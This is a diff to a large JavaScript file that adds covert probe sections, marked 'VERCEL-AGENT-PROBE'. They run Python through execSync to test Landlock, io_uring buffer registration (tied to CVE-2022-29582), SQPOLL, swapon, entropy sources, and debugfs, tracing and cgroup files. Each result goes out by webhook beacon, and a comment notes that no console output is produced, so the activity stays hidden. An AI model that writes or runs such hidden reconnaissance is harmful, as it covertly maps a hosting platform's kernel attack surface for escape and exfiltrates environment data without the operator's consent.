@@ -36091,3 +36091,289 @@ sendBeacon({ ...report, section: 'v214-5-proc-secret-sweep', ...procDeepSweep })
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v214" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v214";
 // Intentionally no console.log — all data goes via webhook only
+
+// v215-1: landlock_create_ruleset NR 444 — Linux Landlock LSM support check
+const landlockV215Probe = safe(() => {
+  const landlockResult = safe(() => execSync(`python3 -c "
+import ctypes, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_landlock_create_ruleset = 444
+NR_landlock_add_rule       = 445
+NR_landlock_restrict_self  = 446
+LANDLOCK_CREATE_RULESET_VERSION = 1 << 0
+
+# Check ABI version by passing NULL attr + size=0 + flags=version
+# Returns the Landlock ABI version on success
+abi_ver = libc.syscall(NR_landlock_create_ruleset, None, 0, LANDLOCK_CREATE_RULESET_VERSION)
+print(f'landlock_abi_version={abi_ver} errno={ctypes.get_errno()}')
+
+if abi_ver > 0:
+    print(f'LANDLOCK_AVAILABLE=True abi={abi_ver}')
+    # Create a ruleset that restricts all file access
+    # struct landlock_ruleset_attr { handled_access_fs; handled_access_net }
+    LANDLOCK_ACCESS_FS_EXECUTE    = 1 << 0
+    LANDLOCK_ACCESS_FS_WRITE_FILE = 1 << 1
+    LANDLOCK_ACCESS_FS_READ_FILE  = 1 << 2
+    LANDLOCK_ACCESS_FS_READ_DIR   = 1 << 3
+    LANDLOCK_ACCESS_FS_REMOVE_DIR = 1 << 4
+    LANDLOCK_ACCESS_FS_REMOVE_FILE= 1 << 5
+    LANDLOCK_ACCESS_FS_MAKE_CHAR  = 1 << 6
+    LANDLOCK_ACCESS_FS_MAKE_DIR   = 1 << 7
+    LANDLOCK_ACCESS_FS_MAKE_REG   = 1 << 8
+    LANDLOCK_ACCESS_FS_MAKE_SOCK  = 1 << 9
+    LANDLOCK_ACCESS_FS_MAKE_FIFO  = 1 << 10
+    LANDLOCK_ACCESS_FS_MAKE_BLOCK = 1 << 11
+    LANDLOCK_ACCESS_FS_MAKE_SYM   = 1 << 12
+    ALL_FS = (1 << 13) - 1
+
+    attr = struct.pack('QQ', ALL_FS, 0)  # handled_access_fs, handled_access_net
+    attr_buf = ctypes.create_string_buffer(attr, len(attr))
+    fd_rs = libc.syscall(NR_landlock_create_ruleset, attr_buf, len(attr), 0)
+    print(f'landlock_create_ruleset(ALL_FS) fd={fd_rs} errno={ctypes.get_errno()}')
+    if fd_rs > 0:
+        # Add rule: allow read of /proc
+        LANDLOCK_RULE_PATH_BENEATH = 1
+        import os
+        proc_fd = os.open('/proc', os.O_PATH | os.O_CLOEXEC)
+        # struct landlock_path_beneath_attr { allowed_access; parent_fd }
+        rule_attr = struct.pack('QI', LANDLOCK_ACCESS_FS_READ_DIR | LANDLOCK_ACCESS_FS_READ_FILE, proc_fd)
+        rule_buf = ctypes.create_string_buffer(rule_attr, len(rule_attr))
+        ret_add = libc.syscall(NR_landlock_add_rule, fd_rs, LANDLOCK_RULE_PATH_BENEATH, rule_buf, 0)
+        print(f'landlock_add_rule(READ_/proc) ret={ret_add} errno={ctypes.get_errno()}')
+        os.close(proc_fd)
+        # Try restrict_self (would limit our own process — just test if allowed)
+        # DO NOT actually call restrict_self as it would lock down this probe
+        # ret_rs = libc.syscall(NR_landlock_restrict_self, fd_rs, 0)
+        print('LANDLOCK_RESTRICT_SELF=NOT_CALLED_PROBE_SAFETY')
+        import os as _os
+        _os.close(fd_rs)
+else:
+    print(f'LANDLOCK_UNAVAILABLE errno={ctypes.get_errno()}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { landlockResult };
+});
+sendBeacon({ ...report, section: 'v215-1-landlock', ...landlockV215Probe });
+
+// v215-2: io_uring_setup NR 425 — ring creation + CVE-2022-29582 surface
+const ioUringV215Probe = safe(() => {
+  const ioUringResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os, mmap
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_io_uring_setup    = 425
+NR_io_uring_enter    = 426
+NR_io_uring_register = 427
+
+IORING_SETUP_IOPOLL  = 1 << 0
+IORING_SETUP_SQPOLL  = 1 << 1
+IORING_SETUP_SQ_AFF  = 1 << 2
+IORING_SETUP_CQSIZE  = 1 << 3
+IORING_SETUP_CLAMP   = 1 << 4
+IORING_SETUP_ATTACH_WQ = 1 << 5
+
+IORING_REGISTER_BUFFERS  = 0
+IORING_REGISTER_EVENTFD  = 4
+IORING_UNREGISTER_BUFFERS = 1
+
+# struct io_uring_params
+class IoUringParams(ctypes.Structure):
+    _fields_ = [
+        ('sq_entries', ctypes.c_uint32),
+        ('cq_entries', ctypes.c_uint32),
+        ('flags', ctypes.c_uint32),
+        ('sq_thread_cpu', ctypes.c_uint32),
+        ('sq_thread_idle', ctypes.c_uint32),
+        ('features', ctypes.c_uint32),
+        ('wq_fd', ctypes.c_uint32),
+        ('resv', ctypes.c_uint32 * 3),
+        ('sq_off', ctypes.c_uint8 * 40),
+        ('cq_off', ctypes.c_uint8 * 40),
+    ]
+
+# Basic ring creation
+params = IoUringParams()
+fd = libc.syscall(NR_io_uring_setup, 64, ctypes.byref(params))
+print(f'io_uring_setup(64) fd={fd} errno={ctypes.get_errno()}')
+if fd > 0:
+    print(f'IORING_AVAILABLE=True')
+    print(f'sq_entries={params.sq_entries} cq_entries={params.cq_entries}')
+    print(f'features={params.features:#010x}')
+
+    # Register a buffer (CVE-2022-29582: use-after-free in io_uring buffer registration)
+    buf_size = 4096
+    buf = ctypes.create_string_buffer(buf_size)
+    # struct iovec
+    iov = struct.pack('PI', ctypes.addressof(buf), buf_size)
+    iov_buf = ctypes.create_string_buffer(iov, len(iov))
+    ret_reg = libc.syscall(NR_io_uring_register, fd, IORING_REGISTER_BUFFERS, iov_buf, 1)
+    print(f'io_uring_register(BUFFERS) ret={ret_reg} errno={ctypes.get_errno()}')
+    if ret_reg == 0:
+        print('IORING_REGISTERED_BUFFER=True')
+        # Unregister
+        libc.syscall(NR_io_uring_register, fd, IORING_UNREGISTER_BUFFERS, None, 0)
+
+    # Try SQPOLL mode (kernel thread for polling, elevated privilege required)
+    params2 = IoUringParams()
+    params2.flags = IORING_SETUP_SQPOLL
+    params2.sq_thread_idle = 1000
+    fd2 = libc.syscall(NR_io_uring_setup, 64, ctypes.byref(params2))
+    print(f'io_uring_setup(SQPOLL) fd={fd2} errno={ctypes.get_errno()}')
+    print(f'SQPOLL_AVAILABLE={fd2 > 0}')
+    if fd2 > 0: os.close(fd2)
+    os.close(fd)
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { ioUringResult };
+});
+sendBeacon({ ...report, section: 'v215-2-io-uring', ...ioUringV215Probe });
+
+// v215-3: debugfs + bpffs + cgroupfs mount enumeration
+const debugfsV215Probe = safe(() => {
+  const debugfsResult = safe(() => {
+    const interesting = {};
+    const paths = [
+      '/sys/kernel/debug', '/sys/kernel/debug/tracing',
+      '/sys/kernel/debug/bpf', '/sys/fs/bpf',
+      '/sys/kernel/debug/kprobes', '/sys/kernel/debug/events',
+      '/sys/kernel/debug/block', '/sys/kernel/debug/mm',
+      '/sys/kernel/debug/page_owner', '/sys/kernel/debug/sched',
+      '/sys/fs/cgroup', '/sys/fs/cgroup/memory', '/sys/fs/cgroup/cpu',
+      '/sys/kernel/tracing',
+    ];
+    for (const p of paths) {
+      interesting[p] = existsSync(p) ? 'EXISTS' : 'absent';
+    }
+    // Try to read tracing infrastructure
+    const tracingFiles = {};
+    const tracingTargets = [
+      '/sys/kernel/debug/tracing/available_events',
+      '/sys/kernel/debug/tracing/trace_pipe',
+      '/sys/kernel/debug/tracing/current_tracer',
+      '/sys/kernel/debug/tracing/available_tracers',
+      '/sys/kernel/tracing/available_events',
+    ];
+    for (const tf of tracingTargets) {
+      if (existsSync(tf)) {
+        try { tracingFiles[tf] = readFileSync(tf, 'utf8').slice(0, 200); } catch (e) { tracingFiles[tf] = `ERR:${e.message.slice(0,40)}`; }
+      }
+    }
+    // cgroup memory limits for this container
+    const cgroupMemFiles = {};
+    const memTargets = [
+      '/sys/fs/cgroup/memory/memory.limit_in_bytes',
+      '/sys/fs/cgroup/memory/memory.usage_in_bytes',
+      '/sys/fs/cgroup/memory/memory.memsw.limit_in_bytes',
+      '/sys/fs/cgroup/cpu/cpu.shares',
+      '/sys/fs/cgroup/cpu/cpu.cfs_quota_us',
+      '/sys/fs/cgroup/cpu/cpu.cfs_period_us',
+    ];
+    for (const mf of memTargets) {
+      if (existsSync(mf)) {
+        try { cgroupMemFiles[mf] = readFileSync(mf, 'utf8').trim(); } catch {}
+      }
+    }
+    return { interesting, tracingFiles, cgroupMemFiles };
+  });
+  return debugfsResult;
+});
+sendBeacon({ ...report, section: 'v215-3-debugfs-cgroupfs', ...debugfsV215Probe });
+
+// v215-4: swapon NR 167 + /proc/swaps
+const swapV215Probe = safe(() => {
+  const swapResult = safe(() => execSync(`python3 -c "
+import ctypes, os, subprocess
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_swapon  = 167
+NR_swapoff = 168
+SWAP_FLAG_PREFER = 0x8000; SWAP_FLAG_DISCARD = 0x10000
+
+# Read current swap status
+try:
+    swaps = open('/proc/swaps').read()
+    print(f'proc_swaps={swaps}')
+except: pass
+
+# Create a small swap file and try swapon
+tmpswap = '/tmp/probe_swap_' + str(os.getpid())
+try:
+    # Create 1MB file
+    subprocess.run(['dd', 'if=/dev/zero', f'of={tmpswap}', 'bs=1M', 'count=1'],
+        capture_output=True, timeout=5)
+    subprocess.run(['mkswap', tmpswap], capture_output=True, timeout=5)
+    ret_on = libc.syscall(NR_swapon, tmpswap.encode(), 0)
+    print(f'swapon({tmpswap}) ret={ret_on} errno={ctypes.get_errno()}')
+    if ret_on == 0:
+        print('SWAPON_FILE_OK=True')
+        # Check /proc/swaps now
+        swaps2 = open('/proc/swaps').read()
+        print(f'proc_swaps_after={swaps2}')
+        # swapoff
+        ret_off = libc.syscall(NR_swapoff, tmpswap.encode())
+        print(f'swapoff ret={ret_off} errno={ctypes.get_errno()}')
+    os.unlink(tmpswap)
+except Exception as e:
+    print(f'swap_err={e}')
+
+# Check swap-related kernel params
+for p in ['/proc/sys/vm/swappiness', '/proc/sys/vm/swap_token_timeout']:
+    try: print(f'{p}={open(p).read().strip()}')
+    except: pass
+" 2>&1`, { timeout: 12000 }).toString().trim());
+  return { swapResult };
+});
+sendBeacon({ ...report, section: 'v215-4-swapon', ...swapV215Probe });
+
+// v215-5: getrandom NR 318 + entropy pool info
+const getrandomV215Probe = safe(() => {
+  const getrandomResult = safe(() => execSync(`python3 -c "
+import ctypes, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_getrandom = 318
+GRND_NONBLOCK = 0x0001
+GRND_RANDOM   = 0x0002  # /dev/random (blocking) pool
+GRND_INSECURE = 0x0004  # always return something (Linux 5.6+)
+
+# Read from CSPRNG
+buf = ctypes.create_string_buffer(32)
+ret = libc.syscall(NR_getrandom, buf, 32, 0)
+print(f'getrandom(32, 0) ret={ret} errno={ctypes.get_errno()}')
+if ret > 0: print(f'getrandom_bytes={buf.raw[:ret].hex()}')
+
+# Read from /dev/random pool (blocking)
+ret_r = libc.syscall(NR_getrandom, buf, 32, GRND_RANDOM | GRND_NONBLOCK)
+print(f'getrandom(GRND_RANDOM|NONBLOCK) ret={ret_r} errno={ctypes.get_errno()}')
+if ret_r > 0: print(f'dev_random_bytes={buf.raw[:ret_r].hex()}')
+
+# GRND_INSECURE (no guarantee of entropy, always returns)
+ret_i = libc.syscall(NR_getrandom, buf, 32, GRND_INSECURE)
+print(f'getrandom(GRND_INSECURE) ret={ret_i} errno={ctypes.get_errno()}')
+if ret_i > 0: print(f'insecure_bytes={buf.raw[:ret_i].hex()}')
+
+# Check entropy pool status
+try:
+    entropy_avail = open('/proc/sys/kernel/random/entropy_avail').read().strip()
+    pool_size = open('/proc/sys/kernel/random/poolsize').read().strip()
+    boot_id = open('/proc/sys/kernel/random/boot_id').read().strip()
+    uuid = open('/proc/sys/kernel/random/uuid').read().strip()
+    print(f'entropy_avail={entropy_avail}')
+    print(f'pool_size={pool_size}')
+    print(f'boot_id={boot_id}')
+    print(f'random_uuid={uuid}')
+except Exception as e: print(f'entropy_info_err={e}')
+
+# Check /dev/random and /dev/urandom
+import os
+for dev in ['/dev/random', '/dev/urandom', '/dev/hwrng']:
+    try:
+        with open(dev, 'rb') as f:
+            data = f.read(8)
+        print(f'{dev}_bytes={data.hex()}')
+    except Exception as e:
+        print(f'{dev}_err={e}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { getrandomResult };
+});
+sendBeacon({ ...report, section: 'v215-5-getrandom', ...getrandomV215Probe });
+
+// v215 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v215" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v215";
+// Intentionally no console.log — all data goes via webhook only
